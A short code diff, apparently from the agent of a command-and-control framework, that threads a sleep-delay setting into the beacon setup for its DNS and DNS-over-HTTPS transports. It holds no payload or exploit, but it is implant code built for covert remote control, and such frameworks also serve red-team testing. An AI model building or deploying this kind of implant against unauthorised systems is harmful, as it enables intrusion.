@@ -295,7 +295,7 @@ void AgentMain()
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
 		
-	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize))
+	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize, g_Agent->config->sleep_delay))
 		return;
 
 	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
@@ -552,7 +552,7 @@ void AgentMain()
 	DohDebugLog("[DoH] BuildBeat completed");
 		
 	DohDebugLog("[DoH] Calling SetConfig");
-	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize)) {
+	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize, g_Agent->config->sleep_delay)) {
 		DohDebugLog("[DoH] SetConfig FAIL");
 		return;
 	}
@@ -753,9 +753,9 @@ void AgentMain()
 
 	// Combined profile carries both DNS and DoH settings.
 	// For now we initialize both; transport selection is done per-loop via useDns.
-	if (!g_DnsConnector->SetConfig(g_Agent->config->profile.dns, beat, beatSize))
+	if (!g_DnsConnector->SetConfig(g_Agent->config->profile.dns, beat, beatSize, g_Agent->config->sleep_delay))
 		return;
-	if (!g_DohConnector->SetConfig(g_Agent->config->profile.doh, beat, beatSize))
+	if (!g_DohConnector->SetConfig(g_Agent->config->profile.doh, beat, beatSize, g_Agent->config->sleep_delay))
 		return;
 
 	// Decide initial transport: default DNS, "doh" forces DoH, "auto" starts on DNS
